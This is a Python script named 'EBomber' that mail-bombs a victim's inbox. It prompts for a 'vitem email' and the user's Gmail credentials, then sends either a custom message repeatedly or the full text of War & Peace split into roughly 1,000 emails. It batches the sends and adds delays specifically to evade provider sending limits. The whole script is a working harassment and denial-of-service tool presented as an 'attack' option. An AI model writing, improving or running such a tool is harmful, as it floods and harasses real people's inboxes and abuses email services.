import pyfiglet
import time
from termcolor import colored
import webbrowser
import smtplib

##################texts####################
print(colored(pyfiglet.figlet_format("EBomber",justify="center"), "green"))
time.sleep(1)
print(colored(pyfiglet.figlet_format("Team C.A.T"), "red"))
time.sleep(0.5)
    ####################inputs#
print("              ")

username = input(colored("Enter your name or skip by prssing enter : ", "yellow"))
print("              ")
print("         "'Hi', username, 'welcome to EBomber')
print("              ")
time.sleep(0.5)
print(colored("         " '[1].Strat Attack', "red"))
time.sleep(0.5)
print(colored("         " '[2].Comment a bug', "red"))
time.sleep(0.5)
print(colored("         " '[3].About us', "red"))
print("              ")
time.sleep(0.5)
    
choice = input(colored("Enter your choice (enter number): ", "yellow"))

if choice == "1":
    print("                                     ")
    choice2 = input(colored("Use your massege for email[1] , use tool power full massege [2]  (enter number): " , "yellow"))
    if choice2 == "1":
        webbrowser.open("www.google.com")
        print(colored("Please watch opend video on web browser if you not watched that you cant run tool not going emails....... : ", "red"))
        print("                  ")
            
        print(colored("Please remeber turn on less secure apps in your google acount  .......  ", "red"))   
        print("                  ") 
        list = []
        print("                  ")
        list.insert(0 , input(colored("Enter Subject: ","yellow")))
                
        print("                  ")
                
        list.insert(1 , input(colored("Enter Body: " , "yellow")))
                
        print("                  ")
                
        list.insert(2 , input(colored("Enter vitem email: " , "yellow")))
                
        print("                  ")
                
        list.insert(3 , input(colored("Enter your email: " , "yellow")))
                
        print("                  ")
                
        list.insert(4 , input(colored("Enter your email's password: " , "yellow")))
                
        print("                  ")
                
        wn = input(colored("massege count you want send: " , "yellow"))
        wni = int(wn)
        print("                  ")
                
        count = 1
        while count <= wni:
            x = list[0]
            y = list[1]
            z = list[2]
            v = list[3]
            cc = list[4]

            message = 'Subject: {}\n\n{}'.format(x, y)
            server = smtplib.SMTP_SSL("smtp.gmail.com" , 465)
            server.login(v , cc)
            server.sendmail(v , z , message)
            print("Sent succes " , count)
            count +=1
    if choice2 == "2":
        webbrowser.open("www.google.com")
        print(colored("Please watch opend video on web browser if you not watched that you cant run tool not going emails....... : ", "red"))
        print("                  ")
            
        print(colored("Please remeber turn on less secure apps in your google acount ....... ", "red"))  

        print("                  ")
        
                
        vvvv = input(colored("Enter vitem email: " , "yellow"))
                
        print("                  ")
                
        yyyy = input(colored("Enter your email: " , "yellow"))
                
        print("                  ")
                
        ppppp = input(colored("Enter your email's password: " , "yellow"))
        # Project Libraries
        # used to get book data from website
        import requests 
        # used to calculate words per message
        from math import floor 
        # used to create delay in loop
        import time 
        # used for sending the email
        import smtplib  as smtp 
        # used to build the email
        from email.message import EmailMessage 


        # import the book data for **War & Peace**
        # Send a request to download the book from the Gutenberg library website
        book_url = 'https://www.gutenberg.org/files/2600/2600-0.txt'
        r = requests.get(book_url)

        # Remove a few ascii characters that are causing problems in the decoding process. Since this just 
        # a hack-email, I do not need the decoding to be 100% correct for every single character.
        book_data = r.text.encode('ascii', 'ignore').decode('ascii')

        # Split the words of each book into a list of words
        word_list = book_data.split(" ")

        # Determine the message size of each email, and then the size of the residual email
        msg_size = floor(len(word_list) / 1000)
        final_msg_size = len(word_list) - (msg_size * 999)
        print(f"Words per message: {msg_size}\nFinal message size: {final_msg_size}")

        ## setup server authentication variables
        '''
            These variables will be used to create the email server connection and from, to headers. Your 
            username may be different from your email address, but probably not.  
            SMTP servers that I've used include: 
            - smtp.gmail.com (port 587)
            - smtp.office365.com (port 587)
            - smtp.mail.yahoo.com (port 587 or 465)
        '''
        user = yyyy
        password = ppppp
        fr_address = yyyy
        to_address = vvvv
        smtp_host = 'smtp.gmail.com' 
        smtp_port = 587

        # setup email variables
        subject = 'War & Peace - Part '
        msg_text = ''
        start_pos = 0
        msg_count = 0

        # create and send email
        ''' Open a connection to the email server, then create and send the email message in separate into 
            chunks of 50 emails in order to avoid sending limits '''
        for b in range(20):
            
            # open the email server connection
            server = smtp.SMTP(host=smtp_host, port=smtp_port)
            server.starttls()
            server.login(user=user, password=password)

            # create and send the message
            for i in range(50):
                # check to see if this is the final message, which has a slightly different range
                if msg_count == 1000:
                    start_pos = (len(word_list)-final_msg_size)
                    msg_text = ' '.join(word_list[start_pos:])
                else:
                    start_pos = msg_count * msg_size
                    msg_text = ' '.join(word_list[start_pos:start_pos + msg_size])

                # create the email message headers and set the payload
                msg = EmailMessage()
                msg['From'] = fr_address
                msg['To'] = to_address
                msg['Subject'] = subject + str(msg_count+1)
                msg.set_payload(msg_text)

                msg_count += 1
                
                # open the email server and send the message
                server.send_message(msg)

                ''' delay each email by 1/2 second to space out the distribution
                    this 1/2 second delay may cause the emails to be delivered out-of-order
                    when some are slightly larger than others.
                '''
                time.sleep(0.5)
            
            # delay each batch by 60 seconds to avoid sending limits
            time.sleep(60)
            
            server.close()



elif choice == "2":
    print("not avalible right now")
elif choice == "3":
    print("not avalible right now")
else:
    print("Wrong input")
    exit()
    time.sleep(0.5)